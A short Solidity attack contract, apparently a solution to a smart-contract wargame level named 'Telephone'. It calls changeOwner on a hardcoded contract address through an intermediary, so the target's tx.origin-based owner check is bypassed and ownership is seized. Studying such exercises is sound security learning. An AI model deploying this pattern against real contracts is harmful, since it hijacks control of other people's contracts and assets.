// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    address telephoneAddress = 0x31c638ec7989e9b6CcD744ADd226b8C432cAb0D8;
    Telephone telephoneContract = Telephone(telephoneAddress);

    function changeOwner() external {
        telephoneContract.changeOwner(msg.sender);
    }
}
